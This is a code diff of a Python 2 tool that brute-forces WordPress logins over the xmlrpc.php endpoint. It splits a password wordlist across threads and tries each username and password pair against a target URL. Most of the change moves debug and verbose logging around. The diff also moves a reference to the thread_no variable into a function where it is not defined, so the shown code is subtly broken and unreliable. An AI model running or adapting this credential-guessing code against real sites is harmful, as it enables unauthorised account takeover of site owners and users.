@@ -41,12 +41,8 @@ def slice_list(input, size):
             result[i].append(iterator.next())
             remain -= 1
     return result
-
-
 def worker(wordlist,thread_no,url):
-    count = 0
     global total
-    
     for n in wordlist:
         current_pass = wordlist.index(n)
         for x in userlist:
@@ -54,16 +50,15 @@ def worker(wordlist,thread_no,url):
             user = userlist[current_user]
             password = wordlist[current_pass]
             if user not in correct_pairs:
-                if (args.verbose == True or args.debug ==True):
-                    try_log = ""
-                    if ( args.debug ==True):
-                        thready = "[Thread " + str(thread_no) + "]"
-                        printout(thready, YELLOW)
-                    print "Trying " + user + " : " + password
-            
                 PasswordAttempt(user,password,url)
         total += 1
 def BuildThreads(list_array,url):
+    if (args.debug == True):
+        print "Here is the content of the wordlists for each thread"
+        for i in range(len(list_array)):
+            print "Thread " + str(i)
+            printout(str(list_array[i]), YELLOW)
+            print "\n-----------------------------------------------------"
     threads = []
     for i in range(len(list_array)):
         t = threading.Thread(target=worker, args=(list_array[i],i,url))
@@ -84,6 +79,9 @@ def PrintBanner():
      =(  _____||________|                 ~n00py~
     """
     print banner
+    print ("Username List: %s" % args.input) + " (" + str(len(userlist)) + ")"
+    print ("Password List: %s" % args.wordlist) + " (" + str(len(passlist)) + ")"
+    print ("URL: %s" % args.url)
 def TestSite(url):
     print "Trying: " + url
     try:
@@ -95,6 +93,12 @@ def TestSite(url):
         printout("Could not identify XMLRPC.  Please verify it's existance.\n", YELLOW)
         sys.exit()
 def PasswordAttempt(user,password,url):
+    if (args.verbose == True or args.debug == True):
+        try_log = ""
+        if (args.debug == True):
+            thready = "[Thread " + str(thread_no) + "]"
+            printout(thready, YELLOW)
+        print "Trying " + user + " : " + password
     headers = {'User-Agent': args.agent,
                'Connection': 'keep-alive',
                'Accept': 'text/html'
@@ -132,27 +136,18 @@ parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, 
 parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
 args = parser.parse_args()
 website = args.url
+threads = args.threads
 url = website +'/xmlrpc.php'
 u = open(args.input, 'r')
 userlist = u.read().split('\n')
 totalusers = len(userlist)
-total = 0
-correct_pairs ={}
-threads = args.threads
 f = open(args.wordlist, 'r')
 passlist = f.read().split('\n')
-print ("Username List: %s" % args.input )  + " (" + str(len(userlist)) + ")"
-print ("Password List: %s" % args.wordlist )  + " (" + str(len(passlist)) + ")"
-print ("URL: %s" % args.url )
+total = 0
+correct_pairs ={}
 PrintBanner()
 TestSite(url)
 list_array = slice_list(passlist, threads)
-if(args.debug==True):
-    print "Here is the content of the wordlists for each thread"
-    for i in range(len(list_array)):
-        print "Thread " + str(i)
-        printout(str(list_array[i]), YELLOW)
-        print "\n-----------------------------------------------------"
 BuildThreads(list_array,url)
 while ((len(correct_pairs) <= totalusers) and  (len(passlist) > total)):
         time.sleep(0.1)
